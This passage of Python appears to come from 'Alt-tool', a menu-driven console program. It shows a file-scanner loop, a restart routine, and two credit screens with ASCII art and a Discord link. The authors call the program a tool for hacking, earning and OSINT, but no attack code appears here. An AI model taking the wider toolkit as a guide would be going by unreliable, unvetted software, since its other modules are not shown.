            
            scanner = AntivirusScanner()
            
            while True:
                if len(sys.argv) > 1:
                    filepath = ' '.join(sys.argv[1:])
                    filepath = filepath.strip('"').strip("'")
                    sys.argv = [sys.argv[0]]
                else:
                    try:
                        filepath = input("\nEnter file path to scan (or 'q' to quit): ").strip()
                        if filepath.lower() in ['q', 'quit', 'exit']:
                            print("\nGoodbye!")
                            break
                        filepath = filepath.strip('"').strip("'")
                    except EOFError:
                        print("\n\nGoodbye!")
                        break
                
                if not filepath:
                    continue
                
                success = scanner.scan_file(filepath)
                
                if success:
                    try:
                        save = input("\nSave report as JSON? (y/n): ").strip().lower()
                        if save in ['y', 'yes']:
                            scanner.save_report()
                    except EOFError:
                        pass
                
                try:
                    again = input("\nScan another file? (y/n): ").strip().lower()
                    if again not in ['y', 'yes']:
                        print("\nScan completed. Goodbye!")
                        break
                except EOFError:
                    print("\n\nGoodbye!")
                    break


        def restart_main_tool():
            try:
                script_dir = os.path.dirname(os.path.abspath(__file__))
                main_tool_path = os.path.join(script_dir, "Alt-Tool-Free-2.py")
                
                if os.path.exists(main_tool_path):
                    python_exec = sys.executable
                    subprocess.Popen([python_exec, main_tool_path])
                    sys.exit(0)
                else:
                    print(f"\nWarning: Alt-Tool-Free-2.py not found in {script_dir}")
            except Exception as e:
                print(f"\nError restarting main tool: {str(e)}")


        if __name__ == "__main__":
            try:
                main()
            except KeyboardInterrupt:
                print("\n\nScan interrupted by user.")
            except Exception as e:
                print(f"\nFatal error: {str(e)}")
                import traceback
                traceback.print_exc()
            finally:
                restart_main_tool()

elif menu_choice == "29":
        os.system('cls' if os.name == 'nt' else 'clear')
        capp = """
                    @@@%%###%%@@@                        
                 @#++===========++#@                     
              @#*===================*#@                  
            @%*=======================*%@         ╔═══╗╔╗  ╔╗ ╔═══╗       ╔╗        
           @#++*#+========+========+#*++#@        ║╔═╗║║║ ╔╝╚╗║╔═╗║       ║║        
          @#+#%#*====+==+++*+==+====*###+*@       ║║ ║║║║ ╚╗╔╝║╚══╗╔══╗ ╔═╝║        
         @##*#%*=========++%=========+%#*##@      ║╚═╝║║║  ║║ ╚══╗║╚ ╗║ ║╔╗║        
         @*#%*#+===+======*======+===+####*%      ║╔═╗║║╚╗ ║╚╗║╚═╝║║╚╝╚╗║╚╝║       
         %####=========+==+==+=========#%###      ╚╝ ╚╝╚═╝ ╚═╝╚═══╝╚═══╝╚══╝      
        @#####*++++++++*%=@=@#++++++++*%*###@            
         %##@#++===+%@@@#=@=*@@@@+===++*@%*#     If you want to follow the few updates        
         %###*#+===*@@@@@=@=@@@@@*===+#*###%     that may come for this tool: https://discord.gg/7kFRXD6A       
         @#*#%%%*==#@@@@@@@@@@@@@#==+%%%%*#@        
          @#*##*%*+%@@@@@@@@@@@@@%+*%*##*#@                                                           
           @#*#%@%%@@@@@@@@@@@@@@@%%@%#*#@              
            @#**###%%%@@@@@@@@@%@%###**%@        AltWolf  
              @#****#%@@@@@@@@@%%****#@               
                 @#+++@@@@@@@@@+++#@@                    
                    @@@@@@@@@@@@@ 
        """
        print_violet_white_gradient(capp)
        input("")
        os.system("python Alt-tool-Free.py")


elif menu_choice == "30":
        os.system('cls' if os.name == 'nt' else 'clear')
        capp = """
                    @@@%%###%%@@@                        
                 @#++===========++#@                     
              @#*===================*#@                  
            @%*=======================*%@         ╔═══╗╔╗  ╔╗ ╔═══╗       ╔╗        
           @#++*#+========+========+#*++#@        ║╔═╗║║║ ╔╝╚╗║╔═╗║       ║║        
          @#+#%#*====+==+++*+==+====*###+*@       ║║ ║║║║ ╚╗╔╝║╚══╗╔══╗ ╔═╝║        
         @##*#%*=========++%=========+%#*##@      ║╚═╝║║║  ║║ ╚══╗║╚ ╗║ ║╔╗║        
         @*#%*#+===+======*======+===+####*%      ║╔═╗║║╚╗ ║╚╗║╚═╝║║╚╝╚╗║╚╝║       
         %####=========+==+==+=========#%###      ╚╝ ╚╝╚═╝ ╚═╝╚═══╝╚═══╝╚══╝      
        @#####*++++++++*%=@=@#++++++++*%*###@            
         %##@#++===+%@@@#=@=*@@@@+===++*@%*#     Hello, we are AltSad, the creators of the Alt-tool.        
         %###*#+===*@@@@@=@=@@@@@*===+#*###%     If you encounter any issues, there's a "contact" option.        
         @#*#%%%*==#@@@@@@@@@@@@@#==+%%%%*#@     I hope you'll enjoy the tool.        
          @#*##*%*+%@@@@@@@@@@@@@%+*%*##*#@      It's a tool for hacking , earning and osint ! Enjoy !                                                       
           @#*#%@%%@@@@@@@@@@@@@@@%%@%#*#@       If you want contact me use discord ! : altwolf or altsad        
            @#**###%%%@@@@@@@@@%@%###**%@        
              @#****#%@@@@@@@@@%%****#@          Team AltSad.        
                 @#+++@@@@@@@@@+++#@@                    
                    @@@@@@@@@@@@@ 
        """
        print_violet_white_gradient(capp)
        input("faite entré pour quitter...")
        os.system("python Alt-tool-Free.py")


elif menu_choice == "30":
        os.system('cls' if os.name == 'nt' else 'clear')